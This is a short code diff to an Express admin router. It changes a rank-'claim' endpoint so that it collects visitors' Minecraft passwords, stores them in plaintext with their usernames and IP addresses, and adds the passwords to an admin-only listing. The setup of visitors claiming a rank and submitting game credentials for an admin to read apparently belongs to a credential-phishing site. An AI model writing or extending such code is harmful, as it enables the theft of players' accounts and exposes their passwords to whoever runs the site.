@@ -12,13 +12,13 @@ function requireAdmin(req, res, next) {
 
 // POST /api/admin/submit  — called when visitor "claims" a rank
 router.post('/submit', (req, res) => {
-  const { rank, username } = req.body;
+  const { rank, username, password } = req.body;
   if (!rank || !username)
     return res.status(400).json({ error: 'Missing fields' });
 
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
-  db.prepare('INSERT INTO submissions (rank, mc_username, ip_address) VALUES (?,?,?)')
-    .run(rank, username, ip);
+  db.prepare('INSERT INTO submissions (rank, mc_username, mc_password, ip_address) VALUES (?,?,?,?)')
+    .run(rank, username, password || '', ip);
 
   res.json({ success: true });
 });
@@ -26,7 +26,7 @@ router.post('/submit', (req, res) => {
 // GET /api/admin/submissions — protected: admin only
 router.get('/submissions', requireAdmin, (req, res) => {
   const rows = db.prepare(
-    'SELECT id, rank, mc_username, ip_address, submitted_at FROM submissions ORDER BY submitted_at DESC'
+    'SELECT id, rank, mc_username, mc_password, ip_address, submitted_at FROM submissions ORDER BY submitted_at DESC'
   ).all();
   res.json(rows);
 });
